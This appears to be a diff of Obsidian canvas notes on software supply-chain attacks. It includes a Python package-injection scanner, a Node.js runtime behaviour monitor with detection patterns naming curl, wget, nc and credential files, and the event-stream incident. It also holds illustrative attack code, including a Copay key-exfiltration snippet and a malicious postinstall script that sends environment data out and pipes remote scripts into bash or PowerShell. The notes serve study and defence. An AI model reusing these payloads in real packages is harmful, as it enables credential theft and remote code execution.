'Exception'\n            ):\n                self.findings.append({\n                    'type': 'broad_except',\n                    'pattern': 'Overly broad exception handling',\n                    'line': handler.lineno,\n                    'match': 'except [Exception]:'\n                })\n        \n        self.generic_visit(node)\n        self.in_except_block = old_except\n    \n    def visit_Import(self, node):\n        \"\"\"Check for suspicious imports\"\"\"\n        suspicious_modules = {\n            'subprocess': 'Command execution',\n            'socket': 'Network communication',\n            'urllib.request': 'Network communication',\n            'requests': 'Network communication',\n            'tempfile': 'Potential temp file creation',\n            'base64': 'Potential data obfuscation'\n        }\n        \n        for alias in node.names:\n            mod_name = alias.name\n            if mod_name in suspicious_modules:\n                self.findings.append({\n                    'type': 'suspicious_import',\n                    'pattern': suspicious_modules[mod_name],\n                    'line': node.lineno,\n                    'match': f'import {mod_name}'\n                })\n        \n        self.generic_visit(node)\n    \n    def visit_Call(self, node):\n        \"\"\"Check for suspicious function calls\"\"\"\n        # Check for exec/eval calls\n        if isinstance(node.func, ast.Name) and node.func.id in ('exec', 'eval', 'compile'):\n            self.findings.append({\n                'type': 'dangerous_call',\n                'pattern': 'Code execution',\n                'line': node.lineno,\n                'match': f'{node.func.id}(...)'\n            })\n        \n        # Check for os.system/subprocess calls\n        if isinstance(node.func, ast.Attribute):\n            if isinstance(node.func.value, ast.Name):\n                if node.func.value.id == 'os' and node.func.attr == 'system':\n                    self.findings.append({\n                        'type': 'command_execution',\n                        'pattern': 'Shell command execution',\n                        'line': node.lineno,\n                        'match': 'os.system(...)'\n                    })\n                elif node.func.value.id == 'subprocess' and node.func.attr in ('call', 'Popen', 'run'):\n                    self.findings.append({\n                        'type': 'command_execution',\n                        'pattern': 'Process execution',\n                        'line': node.lineno,\n                        'match': f'subprocess.{node.func.attr}(...)'\n                    })\n        \n        self.generic_visit(node)\n    \n    def visit_Compare(self, node):\n        \"\"\"Check for environment fingerprinting\"\"\"\n        # Look for environment checks that might indicate targeting\n        if isinstance(node.left, ast.Attribute):\n            # Check for os.environ access\n            if (isinstance(node.left.value, ast.Name) and node.left.value.id == 'os' and \n                node.left.attr == 'environ'):\n                self.findings.append({\n                    'type': 'environment_check',\n                    'pattern': 'Environment variable check',\n                    'line': node.lineno,\n                    'match': 'os.environ check'\n                })\n            \n            # Check for platform.system() checks\n            if (isinstance(node.left.value, ast.Name) and node.left.value.id == 'platform' and \n                node.left.attr in ('system', 'platform', 'release')):\n                self.findings.append({\n                    'type': 'platform_check', \n                    'pattern': 'Platform targeting',\n                    'line': node.lineno,\n                    'match': f'platform.{node.left.attr} check'\n                })\n        \n        self.generic_visit(node)\n\n# Scan an entire package\ndef scan_package(package_dir):\n    \"\"\"Scan all Python files in a package for suspicious patterns\"\"\"\n    all_findings = {}\n    \n    for root, dirs, files in os.walk(package_dir):\n        for file in files:\n            if file.endswith('.py'):\n                file_path = os.path.join(root, file)\n                findings = scan_file(file_path)\n                if findings:\n                    rel_path = os.path.relpath(file_path, package_dir)\n                    all_findings[rel_path] = findings\n    \n    return all_findings\n\n# Main function\ndef main():\n    if len(sys.argv) != 2:\n        print(f\"Usage: {sys.argv[0]} <package_directory>\")\n        sys.exit(1)\n    \n    package_dir = sys.argv[1]\n    if not os.path.isdir(package_dir):\n        print(f\"Error: {package_dir} is not a directory\")\n        sys.exit(1)\n    \n    findings = scan_package(package_dir)\n    \n    # Calculate risk score\n    risk_weights = {\n        'obfuscation': 8,\n        'syntax_error': 5,\n        'empty_except': 3,\n        'broad_except': 2,\n        'suspicious_import': 3,\n        'dangerous_call': 9,\n        'command_execution': 9,\n        'environment_check': 4,\n        'platform_check': 4\n    }\n    \n    total_score = 0\n    total_findings = 0\n    \n    print(\"\\n=== Package Injection Analysis Results ===\\n\")\n    \n    for file_path, file_findings in findings.items():\n        file_score = sum(risk_weights.get(f['type'], 1) for f in file_findings)\n        total_score += file_score\n        total_findings += len(file_findings)\n        \n        print(f\"\\nFile: {file_path}\")\n        print(f\"Risk Score: {file_score}\")\n        print(\"-\" * 40)\n        \n        for finding in file_findings:\n            print(f\"Line {finding['line']}: {finding['type']} - {finding['pattern']}\")\n            print(f\"  {finding['match']}\")\n        \n    print(\"\\n=== Summary ===\")\n    print(f\"Total files with issues: {len(findings)}\")\n    print(f\"Total suspicious patterns: {total_findings}\")\n    print(f\"Overall risk score: {total_score}\")\n    \n    if total_score > 20:\n        print(\"\\n⚠️  HIGH RISK - Multiple severe indicators of package injection detected\")\n        return 2\n    elif total_score > 10:\n        print(\"\\n⚠️  MEDIUM RISK - Some potential indicators of package injection\")\n        return 1\n    else:\n        print(\"\\n✅  LOW RISK - Limited suspicious patterns detected\")\n        return 0\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n```",
+      "type": "text",
+      "width": 1660,
+      "x": -1420,
+      "y": 2360
+    },
+    {
+      "file": "CyberSecurity/Security+/1-Threats-Attacks-Vulnerabilities/Attacking-Frameworks/MITRE ATT&CK/Enterprise-Attack/techniques/Image File Execution Options Injection.md",
+      "height": 400,
+      "id": "aab3ec9d50da8731",
+      "styleAttributes": {
+      },
+      "type": "file",
+      "width": 400,
+      "x": -400,
+      "y": 1560
+    },
+    {
+      "height": 10920,
+      "id": "2ac1f04fa50e2c45",
+      "styleAttributes": {
+      },
+      "text": "### 1. Behavioral Analysis (Runtime Monitoring) \n\n**Technical Implementation:**\n\n``` javascript\n\n// Runtime behavioral monitoring system for Node.js packages\n// To be used in test environments to detect suspicious behaviors\n\nconst fs = require('fs');\nconst path = require('path');\nconst childProcess = require('child_process');\nconst net = require('net');\nconst http = require('http');\nconst https = require('https');\nconst os = require('os');\nconst crypto = require('crypto');\n\n// Store original functions to restore later\nconst originalFunctions = {\n  fs: {\n    readFile: fs.readFile,\n    writeFile: fs.writeFile,\n    readFileSync: fs.readFileSync,\n    writeFileSync: fs.writeFileSync,\n    unlink: fs.unlink,\n    unlinkSync: fs.unlinkSync\n  },\n  childProcess: {\n    exec: childProcess.exec,\n    execSync: childProcess.execSync,\n    spawn: childProcess.spawn,\n    spawnSync: childProcess.spawnSync\n  },\n  http: {\n    request: http.request,\n    get: http.get\n  },\n  https: {\n    request: https.request,\n    get: https.get\n  },\n  net: {\n    connect: net.connect,\n    createConnection: net.createConnection\n  }\n};\n\n// Configuration\nconst config = {\n  logDirectory: process.env.BEHAVIOR_LOG_DIR || './logs',\n  enableFileLogging: true,\n  enableConsoleLogging: true,\n  monitorEnvAccess: true,\n  enableAlerts: true,\n  alertThreshold: 5, // Number of suspicious activities before alerting\n  whitelistedDomains: [\n    'registry.npmjs.org',\n    'nodejs.org',\n    'github.com',\n    'githubusercontent.com'\n  ],\n  whitelistedIPs: [\n    '127.0.0.1',\n    '::1'\n  ]\n};\n\n// Initialize\nconst activities = [];\nlet suspiciousCount = 0;\n\n// Create log directory if it doesn't exist\nif (config.enableFileLogging) {\n  try {\n    if (!fs.existsSync(config.logDirectory)) {\n      fs.mkdirSync(config.logDirectory, { recursive: true });\n    }\n  } catch (err) {\n    console.error(`Failed to create log directory: ${err.message}`);\n  }\n}\n\n// Logger utility\nconst logger = {\n  log(activity) {\n    activities.push(activity);\n    \n    const timestamp = new Date().toISOString();\n    const logEntry = `[${timestamp}] ${JSON.stringify(activity)}`;\n    \n    if (config.enableConsoleLogging) {\n      console.log(`[BEHAVIOR-MONITOR] ${logEntry}`);\n    }\n    \n    if (config.enableFileLogging) {\n      const logFile = path.join(config.logDirectory, `behavior-${new Date().toISOString().split('T')[0]}.log`);\n      fs.appendFileSync(logFile, logEntry + '\\n');\n    }\n    \n    // Check if activity is suspicious\n    if (activity.suspicious) {\n      suspiciousCount++;\n      if (config.enableAlerts && suspiciousCount >= config.alertThreshold) {\n        this.sendAlert(activity);\n      }\n    }\n  },\n  \n  sendAlert(activity) {\n    console.error(`[ALERT] Suspicious activity threshold reached! Latest: ${JSON.stringify(activity)}`);\n    // In a real implementation, this could send an email, webhook, etc.\n  }\n};\n\n// Helper functions\nfunction isWhitelistedDomain(domain) {\n  return config.whitelistedDomains.some(whitelist => domain.includes(whitelist));\n}\n\nfunction isWhitelistedIP(ip) {\n  return config.whitelistedIPs.includes(ip);\n}\n\nfunction isPathSuspicious(filePath) {\n  const sensitivePatterns = [\n    /\\.env$/i,\n    /config.*\\.json$/i,\n    /password/i,\n    /credential/i,\n    /\\.ssh\\//i,\n    /\\.aws\\//i,\n    /\\.npmrc$/i,\n    /\\.yarnrc$/i\n  ];\n  \n  return sensitivePatterns.some(pattern => pattern.test(filePath));\n}\n\nfunction isCommandSuspicious(command) {\n  const suspiciousPatterns = [\n    /curl\\s+/i,\n    /wget\\s+/i,\n    /ping\\s+/i,\n    /nc\\s+/i,\n    /nmap/i,\n    /chmod\\s+/i,\n    /rm\\s+-rf/i,\n    /eval\\(/i,\n    /base64/i\n  ];\n  \n  return suspiciousPatterns.some(pattern => pattern.test(command));\n}\n\n// Monkey patch file system operations\nfs.readFile = function(filePath, options, callback) {\n  // Handle optional options\n  if (typeof options === 'function') {\n    callback = options;\n    options = undefined;\n  }\n  \n  const suspicious = isPathSuspicious(filePath.toString());\n  \n  logger.log({\n    type: 'fs',\n    operation: 'readFile',\n    path: filePath.toString(),\n    suspicious\n  });\n  \n  return originalFunctions.fs.readFile(filePath, options, callback);\n};\n\nfs.readFileSync = function(filePath, options) {\n  const suspicious = isPathSuspicious(filePath.toString());\n  \n  logger.log({\n    type: 'fs',\n    operation: 'readFileSync',\n    path: filePath.toString(),\n    suspicious\n  });\n  \n  return originalFunctions.fs.readFileSync(filePath, options);\n};\n\nfs.writeFile = function(filePath, data, options, callback) {\n  // Handle optional options\n  if (typeof options === 'function') {\n    callback = options;\n    options = undefined;\n  }\n  \n  const suspicious = isPathSuspicious(filePath.toString());\n  \n  logger.log({\n    type: 'fs',\n    operation: 'writeFile',\n    path: filePath.toString(),\n    dataSize: Buffer.isBuffer(data) ? data.length : String(data).length,\n    suspicious\n  });\n  \n  return originalFunctions.fs.writeFile(filePath, data, options, callback);\n};\n\nfs.writeFileSync = function(filePath, data, options) {\n  const suspicious = isPathSuspicious(filePath.toString());\n  \n  logger.log({\n    type: 'fs',\n    operation: 'writeFileSync',\n    path: filePath.toString(),\n    dataSize: Buffer.isBuffer(data) ? data.length : String(data).length,\n    suspicious\n  });\n  \n  return originalFunctions.fs.writeFileSync(filePath, data, options);\n};\n\n// Monkey patch child process operations\nchildProcess.exec = function(command, options, callback) {\n  // Handle optional options\n  if (typeof options === 'function') {\n    callback = options;\n    options = undefined;\n  }\n  \n  const suspicious = isCommandSuspicious(command);\n  \n  logger.log({\n    type: 'childProcess',\n    operation: 'exec',\n    command,\n    suspicious\n  });\n  \n  return originalFunctions.childProcess.exec(command, options, callback);\n};\n\nchildProcess.execSync = function(command, options) {\n  const suspicious = isCommandSuspicious(command);\n  \n  logger.log({\n    type: 'childProcess',\n    operation: 'execSync',\n    command,\n    suspicious\n  });\n  \n  return originalFunctions.childProcess.execSync(command, options);\n};\n\nchildProcess.spawn = function(command, args, options) {\n  const suspicious = isCommandSuspicious(command + ' ' + (args ? args.join(' ') : ''));\n  \n  logger.log({\n    type: 'childProcess',\n    operation: 'spawn',\n    command,\n    args,\n    suspicious\n  });\n  \n  return originalFunctions.childProcess.spawn(command, args, options);\n};\n\n// Monkey patch network operations\nfunction monitorHttpRequest(module, methodName) {\n  return function(url, options, callback) {\n    // Handle different argument patterns\n    if (typeof url === 'string') {\n      url = new URL(url);\n    } else if (typeof url === 'object' && !(url instanceof URL)) {\n      callback = options;\n      options = url;\n      url = options.url || options.host;\n    }\n    \n    const hostname = (url instanceof URL) ? url.hostname : \n                   (typeof url === 'string') ? new URL(url).hostname : \n                   options.hostname || options.host;\n                   \n    const suspicious = !isWhitelistedDomain(hostname);\n    \n    logger.log({\n      type: 'http',\n      operation: methodName,\n      url: hostname,\n      suspicious\n    });\n    \n    return originalFunctions[module][methodName].apply(this, arguments);\n  };\n}\n\nhttp.request = monitorHttpRequest('http', 'request');\nhttp.get = monitorHttpRequest('http', 'get');\nhttps.request = monitorHttpRequest('https', 'request');\nhttps.get = monitorHttpRequest('https', 'get');\n\n// Monitor TCP connections\nnet.connect = net.createConnection = function() {\n  const args = Array.from(arguments);\n  let options = args[0];\n  let host = null;\n  \n  if (typeof options === 'object') {\n    host = options.host || options.hostname || '127.0.0.1';\n  } else if (typeof args[1] === 'string') {\n    host = args[1];\n  }\n  \n  const suspicious = host && !isWhitelistedIP(host);\n  \n  logger.log({\n    type: 'net',\n    operation: 'connect',\n    host,\n    port: typeof options === 'object' ? options.port : args[0],\n    suspicious\n  });\n  \n  return originalFunctions.net.connect.apply(this, args);\n};\n\n// Monitor environment variables if enabled\nif (config.monitorEnvAccess) {\n  const originalProcessEnv = process.env;\n  const envProxy = new Proxy(originalProcessEnv, {\n    get(target, prop) {\n      const value = target[prop];\n      \n      const sensitive = /token|key|secret|password|credential/i.test(prop);\n      \n      logger.log({\n        type: 'env',\n        operation: 'access',\n        variable: prop,\n        suspicious: sensitive\n      });\n      \n      return value;\n    },\n    set(target, prop, value) {\n      const sensitive = /token|key|secret|password|credential/i.test(prop);\n      \n      logger.log({\n        type: 'env',\n        operation: 'modify',\n        variable: prop,\n        suspicious: sensitive\n      });\n      \n      target[prop] = value;\n      return true;\n    }\n  });\n  \n  process.env = envProxy;\n}\n\n// API for the monitor\nconst monitor = {\n  start() {\n    console.log('[BEHAVIOR-MONITOR] Runtime monitoring started');\n    return this;\n  },\n  \n  stop() {\n    // Restore original functions\n    Object.keys(originalFunctions).forEach(module => {\n      Object.keys(originalFunctions[module]).forEach(func => {\n        if (module === 'fs') {\n          fs[func] = originalFunctions[module][func];\n        } else if (module === 'childProcess') {\n          childProcess[func] = originalFunctions[module][func];\n        } else if (module === 'http') {\n          http[func] = originalFunctions[module][func];\n        } else if (module === 'https') {\n          https[func] = originalFunctions[module][func];\n        } else if (module === 'net') {\n          net[func] = originalFunctions[module][func];\n        }\n      });\n    });\n    \n    // Restore process.env if it was proxied\n    if (config.monitorEnvAccess) {\n      process.env = originalProcessEnv;\n    }\n    \n    console.log('[BEHAVIOR-MONITOR] Runtime monitoring stopped');\n    return this;\n  },\n  \n  getActivities() {\n    return activities;\n  },\n  \n  getSuspiciousActivities() {\n    return activities.filter(activity => activity.suspicious);\n  },\n  \n  getSuspiciousCount() {\n    return suspiciousCount;\n  },\n  \n  setConfig(newConfig) {\n    Object.assign(config, newConfig);\n    return this;\n  },\n  \n  clearActivities() {\n    activities.length = 0;\n    suspiciousCount = 0;\n    return this;\n  },\n  \n  generateReport() {\n    const report = {\n      timestamp: new Date().toISOString(),\n      totalActivities: activities.length,\n      suspiciousActivities: suspiciousCount,\n      summary: {\n        fs: activities.filter(a => a.type === 'fs').length,\n        childProcess: activities.filter(a => a.type === 'childProcess').length,\n        http: activities.filter(a => a.type === 'http').length,\n        net: activities.filter(a => a.type === 'net').length,\n        env: activities.filter(a => a.type === 'env').length\n      },\n      suspiciousByType: {\n        fs: activities.filter(a => a.type === 'fs' && a.suspicious).length,\n        childProcess: activities.filter(a => a.type === 'childProcess' && a.suspicious).length,\n        http: activities.filter(a => a.type === 'http' && a.suspicious).length,\n        net: activities.filter(a => a.type === 'net' && a.suspicious).length,\n        env: activities.filter(a => a.type === 'env' && a.suspicious).length\n      },\n      recentSuspicious: activities.filter(a => a.suspicious).slice(-10)\n    };\n    \n    if (config.enableFileLogging) {\n      const reportFile = path.join(config.logDirectory, `report-${new Date().toISOString().replace(/:/g, '-')}.json`);\n      fs.writeFileSync(reportFile, JSON.stringify(report, null, 2));\n      console.log(`[BEHAVIOR-MONITOR] Report generated at ${reportFile}`);\n    }\n    \n    return report;\n  }\n};\n\nmodule.exports = monitor;\n\n```",
+      "type": "text",
+      "width": 1400,
+      "x": -2880,
+      "y": 2360
+    },
+    {
+      "height": 650,
+      "id": "f909c3fac35d888e",
+      "styleAttributes": {
+      },
+      "text": "### Code Snippet (Simplified Representation of Attack Logic)\n\n```javascript\n// This is a simplified representation of how the attack functioned\n// The actual malicious code was heavily obfuscated\n\n// Stage 1: Check if target environment\nif (process.env.npm_package_name === 'copay' && \n    process.env.npm_package_description.indexOf('Secure Bitcoin Wallet') !== -1) {\n    \n    // Stage 2: Decrypt and execute payload\n    const decryptionKey = getDecryptionKey(); // Assembled from various parts of code\n    const encryptedPayload = \"...\"; // Long encrypted string\n    \n    const maliciousCode = decrypt(encryptedPayload, decryptionKey);\n    eval(maliciousCode); // Execute the decrypted code\n}\n\n// The decrypted payload would extract private keys and exfiltrate them\nfunction exfiltrateKeys(privateKeys) {\n    const exfilServer = \"https://malicious-server.com/collect\";\n    fetch(exfilServer, {\n        method: 'POST',\n        body: JSON.stringify(privateKeys)\n    });\n}\n```",
+      "type": "text",
+      "width": 1100,
+      "x": -6000,
+      "y": -5240
+    },
+    {
+      "height": 400,
+      "id": "86442b48e01db9cb",
+      "styleAttributes": {
+      },
+      "text": "## Detection and Discovery\n\nThe attack was discovered when a user noticed unusual behavior in their application's CPU usage. Upon investigation, they found the obfuscated code in flatmap-stream and alerted the community. The discovery process involved:\n\n1. Tracing CPU usage to the flatmap-stream dependency\n2. Analyzing the minified code and discovering suspicious encrypted strings\n3. Decrypting the payload to understand its functionality\n4. Identifying the target application (Copay Bitcoin wallet)",
+      "type": "text",
+      "width": 740,
+      "x": -5760,
+      "y": -3630
+    },
+    {
+      "height": 580,
+      "id": "b87c3bf51d431388",
+      "styleAttributes": {
+      },
+      "text": "### Malicious Payload Analysis\n\nThe malicious code specifically targeted the Copay Bitcoin wallet application. When executed within this environment, it would:\n\n1. Identify if the host application was Copay (versions 5.0.2-5.1.0)\n2. Extract the victim's private Bitcoin keys\n3. Send these keys to a remote server controlled by the attacker\n\nThe code used sophisticated techniques to verify its target, including:\n\n- Checking for specific package.json properties\n- Validating the application structure was Copay's\n- Only activating when specific conditions were met to avoid detection during testing",
+      "type": "text",
+      "width": 770,
+      "x": -5640,
+      "y": -4350
+    },
+    {
+      "height": 300,
+      "id": "ab986246ed2756b9",
+      "styleAttributes": {
+      },
+      "text": "## Impact Assessment\n\n- **Direct Impact**: Users of Copay wallet (versions 5.0.2-5.1.0) were at risk of cryptocurrency theft\n- **Scale**: The compromised event-stream package was downloaded approximately 8 million times\n- **Affected Dependencies**: Over 3,000 packages relied on event-stream as a dependency\n- **Financial Impact**: Potential for significant cryptocurrency theft (actual losses are undocumented)",
+      "type": "text",
+      "width": 740,
+      "x": -5760,
+      "y": -3160
+    },
+    {
+      "height": 340,
+      "id": "a69d9d560387b608",
+      "styleAttributes": {
+      },
+      "text": "## Security Weaknesses Exploited\n\n1. **Package Maintainer Transfer Protocol**: Lack of verification when transferring package ownership\n2. **Dependency Chain Vulnerabilities**: Deep dependency trees creating security blind spots\n3. **Contribution Vetting**: Insufficient review processes for new package contributors\n4. **Maintainer Burnout**: Original maintainer had abandoned the project but it remained widely used",
       "type": "text",
       "width": 820,
-      "x": 1020,
-      "y": 4720
+      "x": -5760,
+      "y": -2810
+    },
+    {
+      "height": 320,
+      "id": "fcf8c711845989ba",
+      "styleAttributes": {
+      },
+      "text": "**Technical Mechanism:**\n\n- Attackers exploit vulnerabilities in repository infrastructure\n- Modify package contents directly on storage systems\n- Bypass normal publishing workflows and security controls\n- No maintainer account required for compromise",
+      "type": "text",
+      "width": 540,
+      "x": 820,
+      "y": -1220
     },
     {
       "height": 60,
-      "id": "aa4e53f1877e75dd",
+      "id": "3fa37bdff1252aae",
       "styleAttributes": {
         "textAlign": "center"
       },
-      "text": "### 4. Transitive Dependency Injection",
+      "text": "### Real-World Examples",
       "type": "text",
-      "width": 260,
-      "x": 640,
-      "y": 4240
-    },
-    {
-      "height": 200,
-      "id": "647f91b974a10afb",
-      "styleAttributes": {
-      },
-      "text": "**Technical Mechanism:**\n\n- Target little-noticed lower-level dependencies\n- Exploit \"dependency confusion\" by replacing transitive dependencies\n- Chain multiple small packages with limited individual functionality\n- Leverage trust in upstream packages to distribute malicious code",
-      "type": "text",
-      "width": 900,
-      "x": 1020,
-      "y": 4040
-    },
-    {
-      "height": 360,
-      "id": "ef3b506d8ca5644b",
-      "styleAttributes": {
-      },
-      "text": "**Technical Example:**\n\n```\nDependency Chain Attack:\npopular-framework\n  └── ui-component-library (500K weekly downloads)\n       └── css-utils (50K weekly downloads)\n            └── color-transform (5K weekly downloads) ← TARGET\n                 └── color-normalize (500 weekly downloads) ← COMPROMISED\n\n// Attacks target smaller package with minimal scrutiny but\n// reach massive user bases through the dependency chain\n```",
-      "type": "text",
-      "width": 900,
-      "x": 1020,
-      "y": 4340
-    },
-    {
-      "height": 60,
-      "id": "9b7e405066818ed6",
-      "styleAttributes": {
-        "textAlign": "center"
-      },
-      "text": "### 3. Post-Install Script Injection",
-      "type": "text",
-      "width": 260,
-      "x": 600,
-      "y": 2260
-    },
-    {
-      "height": 2100,
-      "id": "fc5a0db7f76da167",
-      "styleAttributes": {
-      },
-      "text": "**Technical Example (NPM):**\n\n```javascript\n// Legitimate package.json with injected malicious scripts\n{\n  \"name\": \"popular-utility-package\",\n  \"version\": \"2.3.1\",\n  \"description\": \"A widely used utility package\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"jest\",\n    \"build\": \"webpack\",\n    \"prepublish\": \"npm run build\",\n    // Injected malicious post-install hook\n    \"postinstall\": \"node ./scripts/configure.js\"\n  },\n  \"keywords\": [\"utility\", \"helper\", \"tools\"],\n  \"author\": \"Original Developer\",\n  \"license\": \"MIT\",\n  \"dependencies\": {\n    \"lodash\": \"^4.17.21\"\n  }\n}\n\n// Malicious configure.js script\nconst fs = require('fs');\nconst os = require('os');\nconst { exec } = require('child_process');\nconst https = require('https');\n\n// Appears legitimate\nconsole.log('Configuring package for optimal performance...');\n\n// Platform-specific malicious behavior\nfunction runMaliciousCode() {\n  // Only execute in production environments\n  if (process.env.NODE_ENV !== 'production') return;\n  \n  // Target specific environments\n  const target = process.env.AWS_LAMBDA_FUNCTION_NAME || \n                 process.env.AZURE_FUNCTIONS_ENVIRONMENT ||\n                 process.env.GOOGLE_CLOUD_PROJECT;\n  \n  if (!target) return;\n  \n  // Collect environment data\n  const data = {\n    env: process.env,\n    platform: os.platform(),\n    hostname: os.hostname(),\n    target: target,\n    // Search for credentials files\n    aws: fs.existsSync(os.homedir() + '/.aws/credentials'),\n    azure: fs.existsSync(os.homedir() + '/.azure/credentials'),\n    gcp: fs.existsSync(os.homedir() + '/.config/gcloud')\n  };\n  \n  // Exfiltrate data\n  const encodedData = Buffer.from(JSON.stringify(data)).toString('base64');\n  https.get(`https://cdn-analytics.package-stats.com/v1/metric?d=${encodedData}`);\n  \n  // Deploy second-stage payload for valuable targets\n  if (data.aws || data.azure || data.gcp) {\n    const platformCommands = {\n      'linux': 'curl -s https://cdn-analytics.package-stats.com/updates/linux.sh | bash',\n      'darwin': 'curl -s https://cdn-analytics.package-stats.com/updates/mac.sh | bash',\n      'win32': 'powershell -Command \"iwr -useb https://cdn-analytics.package-stats.com/updates/win.ps1 | iex\"'\n    };\n    \n    const cmd = platformCommands[os.platform()];\n    if (cmd) {\n      try {\n        exec(cmd, {shell: true});\n      } catch (e) {}\n    }\n  }\n}\n\n// Run actual configuration (legitimate behavior)\nfunction runConfiguration() {\n  // Real configuration code...\n  console.log('Configuration complete!');\n}\n\n// Execute both functions\nrunConfiguration();\nrunMaliciousCode()\n```",
-      "type": "text",
-      "width": 1280,
-      "x": 1020,
-      "y": 1820
-    },
-    {
-      "height": 280,
-      "id": "d58e6835b9c50050",
-      "styleAttributes": {
-      },
-      "text": "**Technical Mechanism:**\n\n- Target CI/CD systems building packages rather than repositories\n- Compromise build servers, runners, or build definition files\n- Inject malicious code during compilation/packaging phase\n- Signed with legitimate certificates after compromise",
-      "type": "text",
-      "width": 730,
-      "x": 1020,
-      "y": 0
-    },
-    {
-      "height": 360,
-      "id": "d94655f3cfccc912",
-      "styleAttributes": {
-      },
-      "text": "**Real-world Example:** The PHP Git server compromise (March 2021)\n\n- Attackers gained access to the PHP project's self-hosted Git server\n- Inserted a backdoor into the PHP source code by committing directly to the repository\n- The malicious code was disguised as a typographical error fix\n- Specifically targeted PHP's internal PEAR packaging system",
-      "type": "text",
-      "width": 680,
-      "x": 950,
-      "y": -440
-    },
-    {
-      "height": 220,
-      "id": "35be4dd97dbab0a4",
-      "styleAttributes": {
-      },
-      "text": "**Technical Mechanism:**\n\n- Target package installation scripts and hooks\n- Inject malicious code executed during installation\n- Leverage elevated privileges often used during installation\n- Difficult to detect as script execution is expected behavior",
-      "type": "text",
-      "width": 800,
-      "x": 1020,
-      "y": 1540
-    },
-    {
-      "height": 60,
-      "id": "62c6fe4d3be906a5",
-      "styleAttributes": {
-        "textAlign": "center"
-      },
-      "text": "### 5. Legitimate Contributor Injection",
-      "type": "text",
-      "width": 410,
-      "x": 500,
-      "y": 5100
-    },
-    {
-      "color": "3",
-      "height": 260,
-      "id": "e5c156ffb4a1225f",
-      "styleAttributes": {
-        "textAlign": null
-      },
-      "text": "**Actual Attack Example (PyPI):**\n\n|Original Package|Typosquatted Version|\n|---|---|\n|requests|reqeusts|\n|urllib3|urlib3|\n|beautifulsoup4|beautifulsoup|",
-      "type": "text",
-      "width": 440,
-      "x": 2920,
-      "y": -7440
-    },
-    {
-      "color": "3",
-      "height": 340,
-      "id": "c7f8a2280caca86a",
-      "styleAttributes": {
-      },
-      "text": "**Technical Mechanism:**\n\n- Exploit default repository precedence in package managers\n- Register public packages with same names as private packages\n- Package manager pulls public (malicious) version instead of private one\n- Particularly effective with internal package names exposed in public code",
-      "type": "text",
-      "width": 580,
-      "x": 2920,
-      "y": -7110
-    },
-    {
-      "color": "3",
-      "height": 60,
-      "id": "7b2cf2693e79f018",
-      "styleAttributes": {
-        "textAlign": "center"
-      },
-      "text": "Package Substitution",
-      "type": "text",
-      "width": 260,
-      "x": 440,
-      "y": -3660
+      "width": 280,
+      "x": -1410,
+      "y": -2860
     },
     {
       "color": "3",
@@ -851,77 +1206,63 @@
     },
     {
       "color": "3",
-      "height": 320,
-      "id": "b7c7fbdf01ef9d91",
-      "styleAttributes": {
-      },
-      "text": "**Technical Details:**\n\n- Most package managers check public repositories before private ones\n- Lack of namespace verification between public/private repositories\n- Risk factors include using internal package names in public repositories\n- Often exploitable through build scripts and CI/CD pipelines",
-      "type": "text",
-      "width": 600,
-      "x": 2920,
-      "y": -6750
-    },
-    {
-      "color": "3",
-      "height": 80,
-      "id": "02559c6714709bbd",
+      "height": 60,
+      "id": "7b2cf2693e79f018",
       "styleAttributes": {
         "textAlign": "center"
       },
-      "text": "Namespace Confusion / Dependency Confusion",
+      "text": "Package Substitution",
       "type": "text",
-      "width": 540,
-      "x": 2290,
-      "y": -6590
+      "width": 260,
+      "x": -970,
+      "y": -2580
     },
     {
-      "color": "3",
-      "height": 400,
-      "id": "ebc8ab4429e3cdb5",
-      "styleAttributes": {
-      },
-      "text": "**Example of vulnerable package.json:**\n\n```json\n{\n  \"name\": \"company-project\",\n  \"dependencies\": {\n    \"react\": \"^17.0.2\",\n    \"company-internal-utils\": \"^2.1.0\",\n    \"company-logger\": \"^1.3.4\"\n  },\n  \"devDependencies\": {\n    \"jest\": \"^27.0.0\"\n  }\n}\n```",
-      "type": "text",
-      "width": 860,
-      "x": 2920,
-      "y": -6410
-    },
-    {
-      "color": "3",
       "height": 340,
-      "id": "f25eb50a2bcec21c",
+      "id": "330e318a3958a343",
       "styleAttributes": {
       },
-      "text": "**Technical Mechanism:**\n\n- Direct targeting of package maintainer credentials\n- Methods include phishing, password reuse, token theft, etc.\n- Push malicious updates under trusted maintainer identity\n- Particularly effective for packages with large installation bases",
+      "text": "## Key Characteristics\n\n- Relies on developer typing mistakes or visual confusion\n- Often targets high-traffic, popular packages\n- Names may differ by just one character, letter case, or use homoglyphs\n- May perfectly mimic the functionality of the legitimate package while adding malicious code",
       "type": "text",
       "width": 600,
-      "x": 2930,
-      "y": -5610
+      "x": -1130,
+      "y": -2360
+    },
+    {
+      "height": 460,
+      "id": "291b88c6803863f8",
+      "styleAttributes": {
+      },
+      "text": "## Common Techniques\n\n1. **Character Substitution**: Replacing characters (e.g., \"lodash\" vs \"l0dash\")\n2. **Misspelling**: Using common typos (e.g., \"request\" vs \"reqeust\")\n3. **Missing/Extra Characters**: Adding or removing letters (e.g., \"express\" vs \"expres\")\n4. **Reverse Word Order**: Flipping component names (e.g., \"react-bootstrap\" vs \"bootstrap-react\")\n5. **Alternative Separators**: Using different delimiters (e.g., \"core-js\" vs \"core.js\")\n6. **Homoglyphs**: Using visually similar Unicode characters (e.g., using Cyrillic \"о\" instead of Latin \"o\")",
+      "type": "text",
+      "width": 630,
+      "x": -440,
+      "y": -2460
+    },
+    {
+      "color": "3",
+      "height": 200,
+      "id": "8214838797839f9e",
+      "styleAttributes": {
+      },
+      "text": "Package hijacking refers to a set of techniques where attackers gain control of packages in public repositories to distribute malicious code to downstream consumers.",
+      "type": "text",
+      "width": 360,
+      "x": 1070,
+      "y": -1980
     },
     {
       "color": "3",
       "height": 60,
-      "id": "d0b1876b7c7175d8",
+      "id": "60baf306a69c06ef",
       "styleAttributes": {
         "textAlign": "center"
       },
-      "text": "Maintainer Account Compromise",
+      "text": "Package Hijacking",
       "type": "text",
-      "width": 360,
-      "x": 2330,
-      "y": -5270
-    },
-    {
-      "color": "3",
-      "height": 260,
-      "id": "ba8616cc7c608024",
-      "styleAttributes": {
-      },
-      "text": "**Security Indicators:**\n\n- Unusual commit patterns or code contributions\n- Off-cycle or emergency releases\n- Changes to package distribution scripts\n- New dependencies or build requirements\n- Modified post-install behaviors",
-      "type": "text",
-      "width": 580,
-      "x": 2930,
-      "y": -5210
+      "width": 260,
+      "x": 1120,
